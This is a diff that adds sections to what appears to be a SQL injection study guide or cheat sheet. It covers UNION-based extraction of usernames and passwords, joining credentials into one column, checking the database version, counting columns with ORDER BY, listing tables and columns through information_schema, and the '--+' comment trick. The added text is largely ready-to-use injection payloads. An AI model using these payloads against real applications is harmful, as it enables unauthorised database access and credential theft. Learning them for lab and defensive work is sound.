@@ -183,3 +183,82 @@ You can extract data from other tables like users:
 ' UNION SELECT username, password, NULL FROM users--
 (Assuming 3 columns total and 3rd isn’t displayed)
 ```
+---
+
+## Using a SQL Injection UNION Attack to Retrieve Data
+
+You can retrieve the contents of a table, such as the users table, by submitting an input like:
+```sql
+' UNION SELECT username, password FROM users--+
+```
+---
+
+## Retrieving Multiple Values Within a Single Column
+
+To return multiple values concatenated into a single column, use the concatenation operator:
+
+```sql
+' UNION SELECT username || '~' || password FROM users--+
+```
+
+- Here, || is the concatenation operator in SQL (PostgreSQL), and '~' is used as a separator between values.
+
+- Always identify the number of columns expected by the original query when using UNION.
+
+---
+
+## Examining the Database in SQL Injection Attacks
+
+When analyzing the database for SQL injection, two key points are essential:
+
+- Identify the database version
+
+- Determine the number of columns in the original query
+
+To identify the database version, use:
+```sql
+' UNION SELECT @@version--+
+```
+
+To identify the number of columns, use queries like:
+```sql
+' ORDER BY 1--+
+' ORDER BY 2--+
+...
+or try UNION SELECT with different numbers of columns until the query works without error.
+```
+
+## SQL Injection Comment Syntax Note
+
+- SQL comments start with -- (double hyphen), which tells the SQL engine to ignore the rest of the line.
+
+- Important: -- must be followed by a space or control character to work properly; otherwise, it may cause syntax errors.
+
+Why Use --+ Instead of Just --
+
+In URLs, spaces are encoded as %20 or sometimes represented as +.
+
+Using --+ ensures the server decodes it as -- (double hyphen plus space).
+
+This guarantees the rest of the original query is properly commented out and the injection works reliably.
+
+```sql
+' UNION SELECT username, password FROM users--+
+```
+---
+
+## Listing Database Contents
+
+To enumerate tables in the database, query the information_schema.tables view:
+
+```sql
+' UNION SELECT NULL, table_name FROM information_schema.tables--+
+```
+
+To list columns for a specific table, query information_schema.columns:
+```sql
+' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'users'--+
+```
+
+Use table_name for filtering tables and column_name for columns.
+
